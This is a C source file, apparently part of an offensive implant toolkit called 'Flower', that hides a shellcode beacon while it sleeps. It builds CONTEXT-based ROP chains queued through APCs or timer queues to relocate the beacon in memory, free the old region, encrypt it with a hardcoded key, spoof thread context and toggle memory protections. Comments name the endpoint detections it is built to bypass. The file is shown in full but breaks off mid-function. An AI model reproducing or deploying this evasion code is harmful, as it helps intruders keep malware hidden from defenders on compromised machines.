#include <Flower.h>

/// [ SILLYWARE LLC - ALL RIGHTS RESERVED ]
/// ASSUME THIS SHIT IS NOT PRODUCTION READY LOL


/*
 * kinda messy and may remain a bit rough to use depending on how your project is structured
 * just know the code is written to be fully PIC without any sort of global instance trick
 * and thats why the internal ctx struct has some awkward stuff (like NxtBuf), we love compatibility
 *
 * will probably refactor the code see how i can make it easier for researchers
 * after it gets absolutely torn to pieces
 *
 * for now it serves its purpose and i have a testing ground for my beacon hunting framework :>
 */

/// this source file is split under the following sections:
///
/// FLOWER      => main functions of flower
/// OBF         => slightly modified FOLIAGE/EKKO/ZILEAN
/// ROP         => helper functions to craft CONTEXT based ropchains
///                implementing FLOWER, according to flags (zero, rwx vs rw + rx, etc)
/// UTILS       => misc utils

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///                                                             FLOWER                                                          ///
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/**
 * @brief
 *  silly sleep obfuscation using CONTEXT based ropchain
 *  named flower, allowing to masquerade our beacon as JIT code (RW->RX->FREE)
 *  whilst still allowing for the typical features of sleep obf (stackspoof, encryption, etc)
 *
 *  named as such because it looks like we are "flowing" through memory
 *  you could just try allocating a new region no matter the location and it
 *  would still bypass aforementionned detections, but its funnier this way
 *
 *  main goal was to bypass [CFG-FindHiddenShellcode] and
 *  [EtwTi-FluctuationMonitor], which this project does allow you to dance around
 *  by using the ropchain through different techniques (timers/APCs)
 *
 *  if the ROP chain fails we will default to sleeping with KUSER_SHARED_DATA
 *  if it succeeds the function will rebase it's return address before returning
 *
 * @param Duration
 *  sleep duration (in milliseconds)
 *
 * @param Flags
 *  flags, check README for every flag
 */
FUNC NTSTATUS Flower(
        _In_ ULONG Delay,
        _In_ ULONG Flags
) {
    __asm__( "nop" );
    __asm__( "nop" );
    __asm__( "nop" );

    NTSTATUS    Status  = { 0 };
    FLOWER_CTX  Ctx     = { 0 };

    //
    // str8 up give up if we can't properly
    // resolve our ctx struct
    //
    if ( ! NT_SUCCESS( Status = FlowerCtx( &Ctx, Flags ) ) ) {
        __debugbreak();
        goto LEAVE;
    }


#if FW_DEBUG == 1
    Ctx.Win32.printf( "[FLOWER] [*] Shellcode information:\n" );
    Ctx.Win32.printf( "[FLOWER]           => Current base address: %p\n", Ctx.ShcBase );
    Ctx.Win32.printf( "[FLOWER]           => Length              : 0x%llx\n", Ctx.ShcLength );
    Ctx.Win32.printf( "[FLOWER]           => Shc end address     : %p\n", SHC_END() );
    Ctx.Win32.printf( "[FLOWER]\n");
#endif

    if ( Flags & FLOWER_FOLIAGE_OBF ) {
        //
        // TODO: somehow fibers fuck shit up, try to fix this at a later date
        //
       Status = FwFoliageObf( Delay, &Ctx );
    }

    if ( ( Flags & FLOWER_EKKO_OBF ) || ( Flags & FLOWER_ZILEAN_OBF ) ) {
        Status = FwTimerObf( Delay, &Ctx );
    }

LEAVE:
    //
    // we only want to rebase our return address
    // if a Fw*Obf function failed, meaning we didn't
    // move
    //
    if ( ! NT_SUCCESS( Status ) ) {
        //
        // sleep with KUSER_SHARED_DATA so even if we failed
        // we can ensure that we delayed execution
        // (obv not good nor ideal but could still be important)
        //
        FwSharedSleep( Delay );

    } else {
        FwPatchRetAddr( Ctx.ShcBase, Ctx.NxtBuf );
        Ctx.Win32.printf( "[FLOWER] [+++] flowed successfully ^_^\n" );
    }

#if FW_DEBUG == 1
    Ctx.Win32.printf( "[FLOWER] [+] OG base @ %p; NEW base @ %p\n", Ctx.ShcBase, SHC_START() );
    Ctx.Win32.printf( "[==================================================]\n" );
#endif

    MmZero( &Ctx, sizeof( FLOWER_CTX ) );

    return Status;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///                                                              OBF                                                            ///
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
[==== ramblings ====]

custom APC (FOLIAGE) and timer (EKKO/ZILEAN) sleepobf functions that use a custom CONTEXT based ropchain
codenamed [FLOWER] which masquerades our shellcode as JIT code instead of the default "fluctuating" ones
which current public implementations use, however those get detected by [CFG-FindHiddenShellcode] & [EtwTi-FluctuationMonitor] and that is not cool

[==== /ramblings ====]
 */
#pragma region [foliage]
/// credits => Austin Hudson (ilove2pwn/realoriginal)

FUNC NTSTATUS FwFoliageObf(
        _In_ ULONG TimeOut,
        _In_ PFLOWER_CTX Ctx
) {
    NTSTATUS    Status  = { 0 };
    PVOID       Retaddr = __builtin_return_address( 0 );

    //
    // rop
    //
    PCONTEXT Rop[ FLOWER_MAX_LEN ]  = { 0 };
    CONTEXT RopInit                 = { 0 };
    SHORT    RopCount               = { 0 };
    FLOWER_ROPSTART_PRM StartPrm    = { 0 };
    FLOWER_ROPCHAIN_PRM ChainPrm    = { 0 };

    //
    // handles
    //
    HANDLE Thread   = NULL;
    HANDLE Dupe     = NULL;

    //
    // zero param structs
    //
    MmZero( &ChainPrm, sizeof( FLOWER_ROPCHAIN_PRM ) );
    MmZero( &StartPrm, sizeof( FLOWER_ROPSTART_PRM ) );

    RopInit.ContextFlags = CONTEXT_FULL;

    PRINTF( "[FLOWER] [*] Using FOLIAGE to queue flower [TimeOut: %d]\n", TimeOut )

    if ( NT_SUCCESS( Status = Ctx->Win32.NtCreateEvent( &Ctx->Evnts.Start, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
    {
        if ( NT_SUCCESS( Status = Ctx->Win32.NtCreateThreadEx( &Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), C_PTR( Ctx->Win32.RtlUserThreadStart + 0x21 ), NULL, TRUE, 0, 0x1000 * 30, 0x1000 * 30, NULL ) ) )
        {
            //
            // god has forsaken me the same way NtGetContextThread
            // forsakens the thread handle to the void
            //
            Dupe = Thread;
            if ( NT_SUCCESS( Status = Ctx->Win32.NtGetContextThread( Thread, &RopInit ) ) ) {
                //
                // prepare the memory region to flow into
                //
                if ( ! ( Ctx->NxtBuf = FwpMemPrepare( Ctx, Ctx->ShcLength ) ) ) {
                    PRINTF( "[FLOWER] [-] FwpMemPrepare failed\n" );
                    Status = STATUS_UNSUCCESSFUL;
                    goto LEAVE;
                }

                //
                // craft a param struct for FwRopChain so we can actually
                // free key and close the spoof thread handles etc
                //
                if ( ! NT_SUCCESS( Status = FwRopChainPrm( Ctx, &ChainPrm, &RopInit ) ) ) {
                    PRINTF( "[FLOWER] [-] FwRopChainPrm failed [Status: %p]\n", Status )
                    goto LEAVE;
                }

                //
                // now its up to FwRopChain blah blah blah
                //
                if ( ! NT_SUCCESS( Status = FwRopChain( Ctx, TimeOut, &ChainPrm, Ctx->Config, Rop, &RopCount ) ) ){
                    PRINTF( "[FLOWER] [-] FwRopChain failed [Status: 0x%lx]\n", Status );
                    goto LEAVE;
                }

                //
                // queue the ropchain
                //
                for ( SHORT i = 0; i < RopCount; ++i ) {
                    if ( ! NT_SUCCESS( Status = Ctx->Win32.NtQueueApcThread( Dupe, C_PTR( Ctx->Win32.NtContinue ), Rop[ i ], NULL, NULL ) ) ) {
                        PRINTF( "[FLOWER] [-] NtQueueApcThread failed [Status: 0x%x]\n", Status );
                        goto LEAVE;
                    }
                }

                //
                // resume and alert the thread with the queued APCs
                //
                if ( ! NT_SUCCESS( Status = Ctx->Win32.NtAlertResumeThread( Dupe, NULL ) ) ) {
                    PRINTF( "[FLOWER] [-] NtAlertResumeThread failed [Status: 0x%lx]\n", Status )
                    goto LEAVE;
                }

                //
                // prepare wrapper struct for NtSignalAndWaitForSingleObject
                //
                if ( ! NT_SUCCESS( Status = FwpRopstartPrm( Ctx, &StartPrm, Ctx->Evnts.Start, Dupe, Ctx->ShcBase,Ctx->NxtBuf ) ) ) {
                    PRINTF( "[FLOWER] [-] Failed to prepare FLOWER_ROPSTART_PRM struct [Status: 0x%lx]\n", Status );
                    goto LEAVE;
                }


                //
                // signal the ropchain to start and wait for the thread to be done
                //
                PRINTF( "[FLOWER] [*] Launching ropchain\n" )
                PRINTF( "[FLOWER] [!] Zzzz Zzzz Zzzz Zzzz Zzzz\n")


                //
                // since we jump to NtSignalAndWaitForSingleObject
                // we can catch the NTSTATUS as it's returned to us
                //
                FwRopStart( StartPrm );

            } else {
                PRINTF( "[FLOWER] [-] NtGetContextThread failed [Status: 0x%lx]\n", Status )

            }

        }  else {
            PRINTF( "[FLOWER] [-] NtCreateThreadEx failed [Status: 0x%lx]\n", Status )
        }

    } else {
        PRINTF( "[FLOWER] [-] NtCreateEvent failed [Status: 0x%lx]\n", Status )
    }

LEAVE:

    //
    // let's avoid returning in the old memory if we moved
    //
    if ( NT_SUCCESS( Status ) ) {
        PRINTF( "[FLOWER] [*] Eepy time was successful, patching return address... [OG retaddr @ %p]\n", Retaddr );
        FwPatchRetAddr( Ctx->ShcBase, Ctx->NxtBuf );
        PRINTF( "[FLOWER] [+] Patched return address [NEW retaddr @ %p]\n", __builtin_return_address( 0 ) );

    } else PRINTF( "[FLOWER] [-] FwFoliageObf failed :(\n" );


    //
    // terminate sleep thread
    //
    if ( Dupe != NULL ) {
        Ctx->Win32.NtTerminateThread( Dupe, STATUS_SUCCESS );
        Ctx->Win32.NtClose( Dupe );
    }

    //
    // zero + free used CONTEXT structs
    //
    for ( SHORT i = 0; i < RopCount; i++ ) {
        MmZero( Rop[ i ], sizeof( CONTEXT ) );
        Ctx->Win32.LocalFree( Rop[ i ] );
    }

    //
    // zero param structs
    //
    MmZero( &ChainPrm, sizeof( FLOWER_ROPCHAIN_PRM ) );
    MmZero( &StartPrm, sizeof( FLOWER_ROPSTART_PRM ) );

    return Status;

}

#pragma endregion

#pragma region [timer]
/// credits => 5pider tha timer gooner

FUNC BOOL FwTimerObf(
        _In_ ULONG TimeOut,
        _In_ PFLOWER_CTX Ctx
) {
    //
    // handles (event handles are stored in Ctx->Evnts)
    //
    HANDLE Queue    = { 0 };
    HANDLE Timer    = { 0 };
    HANDLE ThdSrc   = { 0 };

    //
    // base CONTEXTs
    //
    PCONTEXT Rop[ FLOWER_MAX_LEN ]   = { 0 };
    CONTEXT  TimerCtx                = { 0 };

    //
    // flower specific
    //
    FLOWER_ROPSTART_PRM StartPrm = { 0 };
    FLOWER_ROPCHAIN_PRM ChainPrm = { 0 };

    SHORT    RopCount  = { 0 };
    ULONG    Delay     = { 0 };
    NTSTATUS Status    = { 0 };
    PVOID    Retaddr   = __builtin_return_address( 0 );

    //
    // zero param structs
    //
    MmZero( &StartPrm, sizeof( FLOWER_ROPSTART_PRM ) );
    MmZero( &ChainPrm, sizeof( FLOWER_ROPCHAIN_PRM ) );

    TimerCtx.ContextFlags   = CONTEXT_FULL;

    PRINTF( "[FLOWER] [-] Using timers to queue flower (%s) [TimeOut: %dms]\n", ( Ctx->Config & FLOWER_EKKO_OBF ? "FLOWER_EKKO_OBF" : "FLOWER_ZILEAN_OBF" ), TimeOut );

    //
    // either create a timer queue [EKKO] or
    // create a wait event [ZILEAN]
    //
    if ( Ctx->Config & FLOWER_EKKO_OBF ) {
        Status = Ctx->Win32.RtlCreateTimerQueue( &Queue );
    }
    else if ( Ctx->Config & FLOWER_ZILEAN_OBF ) {
        Status = Ctx->Win32.NtCreateEvent( &Ctx->Evnts.Wait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    }
    if ( NT_SUCCESS( Status ) ) {
        //
        // create events
        //
        if ( NT_SUCCESS( Status = Ctx->Win32.NtCreateEvent( &Ctx->Evnts.Timer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( Status = Ctx->Win32.NtCreateEvent( &Ctx->Evnts.Start, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( Status = Ctx->Win32.NtCreateEvent( &Ctx->Evnts.Delay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) )
        ) {
            //
            // get the context of the timer thread based on the method used
            //
            if ( Ctx->Config & FLOWER_EKKO_OBF ) {
                Status = Ctx->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Ctx->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
            } else if ( Ctx->Config & FLOWER_ZILEAN_OBF ) {
                Status = Ctx->Win32.RtlRegisterWait( &Timer, Ctx->Evnts.Wait, C_PTR( Ctx->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
            }

            if ( NT_SUCCESS( Status ) ) {
                //
                // send event that we got the context of the timer thread
                // NOTE: using a wrapper function to achieve this
                //
                if ( Ctx->Config & FLOWER_EKKO_OBF ) {
                    Status = Ctx->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( FwEventSet ), Ctx->Evnts.Timer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
                } else if ( Ctx->Config & FLOWER_ZILEAN_OBF ) {
                    Status = Ctx->Win32.RtlRegisterWait( &Timer, Ctx->Evnts.Wait, C_PTR( FwEventSet ), Ctx->Evnts.Timer, Delay += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE );
                }

                if ( NT_SUCCESS( Status ) ) {
                    //
                    // wait until we successfully retrieved the timers thread ctx
                    //
                    if ( ! NT_SUCCESS( Status = Ctx->Win32.NtWaitForSingleObject( Ctx->Evnts.Timer, FALSE, NULL ) ) ) {
                        PRINTF( "[FLOWER] [-] Failed waiting for starting event [Status: 0x%lx]\n", Status );
                        goto LEAVE;
                    }

                    //
                    // prepare the memory region to flow into
                    //
                    if ( ! ( Ctx->NxtBuf = FwpMemPrepare( Ctx, Ctx->ShcLength ) ) ) {
                        PRINTF( "[FLOWER] [-] FwpMemPrepare failed\n" );
                        goto LEAVE;
                    }

                    //
                    // prepare param struct for the ropchain crafting
                    //
                    if ( ! NT_SUCCESS( Status = FwRopChainPrm( Ctx, &ChainPrm, &TimerCtx ) ) ) {
                        PRINTF( "[FLOWER] [-] FwpRopChainPrm failed\n" )
                        goto LEAVE;
                    }

                    //
                    // now its up to FwRopChain blah blah blah
                    //
                    if ( ! NT_SUCCESS( Status = FwRopChain( Ctx, TimeOut + Delay, &ChainPrm, Ctx->Config, Rop, &RopCount ) ) ){
                        PRINTF( "[FLOWER] [-] FwRopChain failed [Status: 0x%lx]\n", Status );
                        goto LEAVE;
                    }


                    PRINTF( "[FLOWER] [+] ROP chain ready\n")

                    //
                    // queue the ropchain
                    //
                    for ( SHORT i = 0; i < RopCount; ++i ) {
                        if ( Ctx->Config & FLOWER_EKKO_OBF ) {
                            if ( ! NT_SUCCESS( Status = Ctx->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Ctx->Win32.NtContinue ), Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                                PRINTF( "[FLOWER] [-] RtlCreateTimer failed [Status: 0x%lx]\n", Status );
                                goto LEAVE;
                            }
                        } else if ( Ctx->Config & FLOWER_ZILEAN_OBF ) {
                            if ( ! NT_SUCCESS( Status = Ctx->Win32.RtlRegisterWait( &Timer, Ctx->Evnts.Wait, C_PTR( Ctx->Win32.NtContinue ), Rop[ i ], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
                                PRINTF( "[FLOWER] [-] RtlRegisterWait failed [Status: 0x%lx]\n", Status );
                                goto LEAVE;
                            }
                        }
                    }

                    //
                    // prepare wrapper struct for NtSignalAndWaitForSingleObject
                    //
                    if ( ! NT_SUCCESS( Status = FwpRopstartPrm( Ctx, &StartPrm, Ctx->Evnts.Start, Ctx->Evnts.Delay,Ctx->ShcBase, Ctx->NxtBuf ) ) ) {
                        PRINTF( "[FLOWER] [-] Failed to prepare FLOWER_ROPSTART_PRM struct [Status: 0x%lx]\n", Status );
                        goto LEAVE;
                    }

                    //
                    // execute the ropchain using our wrapper
                    // so NtSignalAndWaitForSingleObject does not
                    // return in the freed memory
                    //
                    PRINTF( "[FLOWER] [*] Launching ropchain\n" )
                    PRINTF( "[FLOWER] [!] Zzzz Zzzz Zzzz Zzzz Zzzz\n")
                    FwRopStart( StartPrm );

                }
            } else {
                PRINTF( "[FLOWER] [-] %s failed [Status: 0x%lx]\n", ( Ctx->Config & FLOWER_EKKO_OBF ? "RtlCreateTimer" : "RtlRegisterWait" ), Status );
            }
        } else {
            PRINTF( "[FLOWER] [-] NtCreateEvent failed [Status: 0x%lx]\n", Status );
        }
    } else {
        PRINTF( "[FLOWER] [-] %s failed [Status: 0x%lx]\n", ( Ctx->Config & FLOWER_EKKO_OBF ? "RtlCreateTimer" : "NtCreateEvent" ), Status );
    }

LEAVE:
    //
    // let's avoid returning in the old memory if we moved
    //
    if ( NT_SUCCESS( Status ) ) {
        PRINTF( "[FLOWER] [*] Eepy time was successful, patching return address... [OG retaddr @ %p]\n", Retaddr );
        FwPatchRetAddr( Ctx->ShcBase, Ctx->NxtBuf );
        PRINTF( "[FLOWER] [+] Patched return address [NEW retaddr @ %p]\n", __builtin_return_address( 0 ) );

    } else PRINTF( "[FLOWER] [-] FwTimerObf failed :(" );


    if ( Queue ) {
        Ctx->Win32.RtlDeleteTimerQueue( Queue );
        Queue = NULL;
    }

    if ( Ctx->Evnts.Start ) {
        Ctx->Win32.NtClose( Ctx->Evnts.Start );
        Ctx->Evnts.Start = NULL;
    }

    if ( Ctx->Evnts.Delay ) {
        Ctx->Win32.NtClose( Ctx->Evnts.Delay );
        Ctx->Evnts.Delay = NULL;
    }

    if ( Ctx->Evnts.Timer ) {
        Ctx->Win32.NtClose( Ctx->Evnts.Timer );
        Ctx->Evnts.Timer = NULL;
    }

    if ( Ctx->Evnts.Wait ) {
        Ctx->Win32.NtClose( Ctx->Evnts.Wait );
        Ctx->Evnts.Wait = NULL;
    }


    //
    // zero + free the used CONTEXT structs
    //
    for ( SHORT i = 0; i < RopCount; i++ ) {
        MmZero( Rop[ i ], sizeof( CONTEXT ) );
        Ctx->Win32.LocalFree( Rop[ i ] );
    }

    //
    // zero param structs
    //
    MmZero( &StartPrm, sizeof( FLOWER_ROPSTART_PRM ) );
    MmZero( &ChainPrm, sizeof( FLOWER_ROPCHAIN_PRM ) );


    return Status;
}

#pragma endregion

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///                                                              ROP                                                            ///
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*!
 * @brief
 *  helper function to craft a flower ropchain
 *  depending on flags. will be used by our custom
 *  FOLIAGE/EKKO/ZILEAN functions
 *
 *  making such a function to avoid dupe code in both functions
 *  and also to allow for modularity
 *
 *  once used, every CONTEXT struct must be freed with
 *  LocalFree
 *
 * @param Ctx
 *  pointer to internal FLOWER_CTX struct
 *  needed for functions, shc info, etc
 *
 * @param Delay
 *  sleep delay
 *
 * @param Prm
 *  pointer to a FLOWER_ROPCHAIN_PRM which contains
 *  info such as the initialization context but also
 *  key/buffer info for sleep encryption
 *
 *  doing it this way so it's easier to free/zero
 *
 * @param Flags
 *  flags so we know whats up
 *
 * @param Rop
 *  array of pointers to each CONTEXT struct, those
 *  will act as our rudimentary ropchain
 *
 * @param RopLen
 *  length of the ropchain (we allocate more than we probably need and that's ok)
 *
 * @return
 *  0 if success else something went wrong
 */
FUNC NTSTATUS FwRopChain(
        _In_  PFLOWER_CTX   Ctx,
        _In_  ULONG         Delay,
        _In_  PFLOWER_ROPCHAIN_PRM Prm,
        _In_  ULONG         Flags,
        _Out_ PCONTEXT*     Rop,
        _Out_ PSHORT       RopLen
) {
    NTSTATUS    Status      = { 0 };

    //
    // ropmaxxing
    //
    SHORT       Idx         = 0;
    PVOID       JmpGadget   = 0;

    //
    // bs
    //
    ULONG  Tmp = { 0 };

    //
    // allocate FLOWER_MAX_LEN CONTEXTs on the heap
    // we will probably not use all of them but easier like this
    //
    if ( ! NT_SUCCESS( Status = FwpRopAlloc( Ctx, Rop ) ) ) {
        PRINTF( "[FLOWER] [-] FwpRopAlloc failed [Status: 0x%lx]\n", Status );
        goto LEAVE;
    }

    //
    // prepare the rop chain
    //
    for ( SHORT i = 0; i < FLOWER_MAX_LEN; ++i ) {
        MmCopy( Rop[ i ], Prm->RopInit, sizeof( CONTEXT ) );
        Rop[ i ]->Rip =  U_PTR( Prm->Gadget );
    }

    //
    // fixup the stack of each context
    //
    if ( ! NT_SUCCESS( Status = FwpRopStackFixup( Ctx, Rop, FLOWER_MAX_LEN, Flags ) ) ) {
        PRINTF( "[FLOWER] [-] Failed to fixup CONTEXT stacks [Status: 0x%lx]\n", Status );
        goto LEAVE;
    }

    //
    // craft the ropchain according to flags
    //
    OBF_JMP( Idx, Ctx->Win32.WaitForSingleObjectEx );
    Rop[ Idx ]->Rcx = U_PTR( Ctx->Evnts.Start );
    Rop[ Idx ]->Rdx = U_PTR( INFINITE );
    Rop[ Idx ]->R8  = U_PTR( FALSE );
    Idx++;

    //
    // copy ourselves to the new region
    // NOTE: can use RtlCopyMemory or literally any write function
    //
    OBF_JMP( Idx, Ctx->Win32.RtlMoveMemory )
    Rop[ Idx ]->Rcx = U_PTR( Ctx->NxtBuf );
    Rop[ Idx ]->Rdx = U_PTR( Ctx->ShcBase );
    Rop[ Idx ]->R8  = U_PTR( Ctx->ShcLength );
    Idx++;


    if ( Flags & FLOWER_ZERO_PROTECT ) {
        PRINTF( "[FLOWER] [*] FLOWER_ZERO_PROTECT\n" )
        //
        // we flip back the old region from RX to RW
        //
        OBF_JMP( Idx, Ctx->Win32.VirtualProtect )
        Rop[ Idx ]->Rcx = U_PTR( Ctx->ShcBase );
        Rop[ Idx ]->Rdx = U_PTR( Ctx->ShcLength );
        Rop[ Idx ]->R8  = U_PTR( PAGE_READWRITE );
        Rop[ Idx ]->R9  = U_PTR( &Tmp );
        Idx++;

        OBF_JMP( Idx, Ctx->Win32.RtlZeroMemory )
        Rop[ Idx ]->Rcx = U_PTR( Ctx->ShcBase );
        Rop[ Idx ]->Rdx = U_PTR( Ctx->ShcLength );
        Idx++;
    }

    //
    // free the old region
    //
    OBF_JMP( Idx, Ctx->Win32.VirtualFree )
    Rop[ Idx ]->Rcx = U_PTR( Ctx->ShcBase );
    Rop[ Idx ]->Rdx = U_PTR( 0 );
    Rop[ Idx ]->R8  = U_PTR( MEM_RELEASE );
    Idx++;

    //
    // encrypt
    //
    OBF_JMP( Idx, Ctx->Win32.SystemFunction032 )
    Rop[ Idx ]->Rcx = U_PTR( &Prm->Crypt.Img );
    Rop[ Idx ]->Rdx = U_PTR( &Prm->Crypt.Key );
    Idx++;

    if ( Flags & FLOWER_STACKSPOOF ) {
        PRINTF( "[FLOWER] [*] FLOWER_STACKSPOOF\n" )
        //
        // backup our CONTEXT
        //
        OBF_JMP( Idx, Ctx->Win32.NtGetContextThread )
        Rop[ Idx ]->Rcx = U_PTR( Prm->Spoof.Thd );
        Rop[ Idx ]->Rdx = U_PTR( &Prm->Spoof.OgCtx );
        Idx++;

        //
        // spoof our CONTEXT
        //
        OBF_JMP( Idx, Ctx->Win32.NtSetContextThread )
        Rop[ Idx ]->Rcx = U_PTR( Prm->Spoof.Thd );
        Rop[ Idx ]->Rdx = U_PTR( &Prm->Spoof.SpfCtx );
        Idx++;
    }

    //
    // it's totally possible to add additional CONTEXT structs to sleep
    // in RX instead, requires moving one more time but heh u2u
    //

    //
    // sleep (could swap with NtDelayExecution or whatever)
    //
    OBF_JMP( Idx, Ctx->Win32.WaitForSingleObjectEx )
    Rop[ Idx ]->Rcx = U_PTR( NtCurrentProcess() );
    Rop[ Idx ]->Rdx = U_PTR( Delay );
    Rop[ Idx ]->R8  = U_PTR( FALSE );
    Idx++;

    //
    // decrypt
    //
    OBF_JMP( Idx, Ctx->Win32.SystemFunction032 )
    Rop[ Idx ]->Rcx = U_PTR( &Prm->Crypt.Img );
    Rop[ Idx ]->Rdx = U_PTR( &Prm->Crypt.Key );
    Idx++;

    if ( Flags & FLOWER_STACKSPOOF ) {
        //
        // restore original CONTEXT so we dont crash
        //
        OBF_JMP( Idx, Ctx->Win32.NtSetContextThread )
        Rop[ Idx ]->Rcx = U_PTR( Prm->Spoof.Thd );
        Rop[ Idx ]->Rdx = U_PTR( &Prm->Spoof.OgCtx );
        Idx++;
    }

    //
    // flip NxtBuf to RX to continue execution
    //
    OBF_JMP( Idx, Ctx->Win32.VirtualProtect )
    Rop[ Idx ]->Rcx = U_PTR( Ctx->NxtBuf );
    Rop[ Idx ]->Rdx = U_PTR( Ctx->ShcLength );
    Rop[ Idx ]->R8  = U_PTR( PAGE_EXECUTE_READ );
    Rop[ Idx ]->R9  = U_PTR( &Tmp );
    Idx++;


    //
    // the last node in the ropchain differs between
    // APC vs timer based sleep obfuscation
    //
    if ( Flags & FLOWER_FOLIAGE_OBF ) {
        OBF_JMP( Idx, Ctx->Win32.RtlExitUserThread );
        Rop[ Idx ]->Rcx = U_PTR( EXIT_SUCCESS );
        Idx++;

    } else if ( ( Flags & FLOWER_EKKO_OBF ) || ( Flags & FLOWER_ZILEAN_OBF ) ) {
        OBF_JMP( Idx, Ctx->Win32.NtSetEvent );
        Rop[ Idx ]->Rcx = U_PTR( Ctx->Evnts.Delay );
        Rop[ Idx ]->Rdx = U_PTR( NULL );
        Idx++;
    }

    //
    // we free the CONTEXT structs that wont be used
    //
    for ( SHORT i = Idx; i < FLOWER_MAX_LEN; ++i ) {
        Ctx->Win32.LocalFree( Rop[ i ] );
    }

    //
    // the end
    //
    *RopLen = Idx;

    PRINTF( "[FLOWER] [*] CONTEXTs to be queued: %d\n", Idx );

LEAVE:
    return Status;
}

/*!
 * @brief
 *  allocate FLOWER_MAX_LEN CONTEXT structs on the heap
 *  if an allocation fails we free each one we made so far
 *  and bail out
 *
 *  said CONTEXT structs must be freed with LocalFree
 *
 * @param Ctx
 *  pointer to internal FLOWER_CTX struct
 *
 * @param Rop
 *  array of CONTEXT ptrs to write to
 *
 * @return
 *  NTSTATUS
 */
FUNC NTSTATUS FwpRopAlloc(
        _In_ PFLOWER_CTX Ctx,
        _Out_ PCONTEXT*  Rop
) {
    //
    // allocate all our contexts struct on the heap
    // you may want to reduce the length in [Flower.h]
    //
    PRINTF( "[FLOWER] [*] Allocating CONTEXT structs\n" );
    for ( SHORT i = 0; i < FLOWER_MAX_LEN; ++i ) {
        Rop[ i ] = Ctx->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

        //
        // if the allocation failed walk the allocations
        // backwards freeing each one
        //
        if ( ! Rop[ i ] ) {
            PRINTF( "[FLOWER] [-] Allocation failed, bailing out [count: %d, LastError: &d]\n", i, NtCurrentTeb()->LastErrorValue );
            for ( ; i >= 0; --i ) {
                Ctx->Win32.LocalFree( Rop[ i ] );

                return STATUS_INSUFFICIENT_RESOURCES;
            }
        }
    }

    return STATUS_SUCCESS;
}

/*!
 * @brief
 *  patch up the stack of each CONTEXT struct depending on
 *  configuration flags. this is done because APC based
 *  sleepobf achieves its purpose in a subtly different way
 *  than the timer based ones
 *
 * @param Ctx
 *  ptr to internal ctx struct
 *
 * @param Rop
 *  array of PCONTEXTs
 *
 * @param Count
 *  the count of context structs forming the ropchain
 *  we use this because we allocate an arbitrary numbers
 *  but actually use a lower one (configurability purposes)
 *
 * @param Flags
 *  configuration flags, honestly could just use
 *  Ctx->Config
 *
 * @return NTSTATUS
 */
FUNC NTSTATUS FwpRopStackFixup(
        _In_ PFLOWER_CTX Ctx,
        _In_ PCONTEXT* Rop,
        _In_ SHORT Count,
        _In_ ULONG Flags
) {

    //
    // sanity check
    //
    if ( ! Rop || ! Flags || ! Count || ! Ctx ) {
        return STATUS_UNSUCCESSFUL;
    }

    //
    // this still allows for stack args
    //
    for ( SHORT i = 0; i < Count; ++i ) {
        //
        // if we are using FOLIAGE we need to return on NtTestAlert
        // aswell as account for the stack size of each thing
        //
        if ( Flags & FLOWER_FOLIAGE_OBF ) {
            //
            // allocate callee reserved space
            //
            Rop[ i ]->Rsp -= U_PTR( 0x1000 * ( Count - i ) );

            //
            // return on NtTestAlert to run the next queued APC
            //
            C_DEF( Rop[ i ]->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Ctx->Win32.NtTestAlert );

        } else if ( ( Flags & FLOWER_EKKO_OBF ) || ( Flags & FLOWER_ZILEAN_OBF ) ) {
            //
            // Rsp - 8
            //
            Rop[ i ]->Rsp -= sizeof( PVOID );
        }
    }

    return STATUS_SUCCESS;
}

FUNC NTSTATUS FwRopChainPrm(
    _In_  PFLOWER_CTX Ctx,
    _Out_ PFLOWER_ROPCHAIN_PRM Prm,
    _In_ PCONTEXT RopInit
) {
    BYTE Pattern[]  = { 0xFF, 0xE0 };

    if ( !Ctx || !Prm || !RopInit ) {
        return STATUS_UNSUCCESSFUL;
    }


    //
    // hardcode the key cuz funny
    //
    UCHAR  KeyBuf[ 16 ]  = { 0x21, 0x21, 0x21, 0x57, 0x54, 0x46, 0x20, 0x65, 0x72, 0x61, 0x77, 0x79, 0x6c, 0x6c, 0x69, 0x73 };

    //
    // setup key
    //
    Prm->Crypt.Key.Buffer = KeyBuf;
    Prm->Crypt.Key.Length = Prm->Crypt.Key.MaximumLength = 0x10;

    //
    // setup image
    //
    Prm->Crypt.Img.Buffer = Ctx->NxtBuf;
    Prm->Crypt.Img.Length = Prm->Crypt.Key.MaximumLength = Ctx->ShcLength;

    Prm->RopInit = RopInit;

    //
    // if stack spoofing is specified, we'll prepare some stuff
    //
    if ( Ctx->Config & FLOWER_STACKSPOOF ) {
        if ( !NT_SUCCESS( Ctx->Win32.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &Prm->Spoof.Thd, THREAD_ALL_ACCESS, 0, 0 ) ) ) {
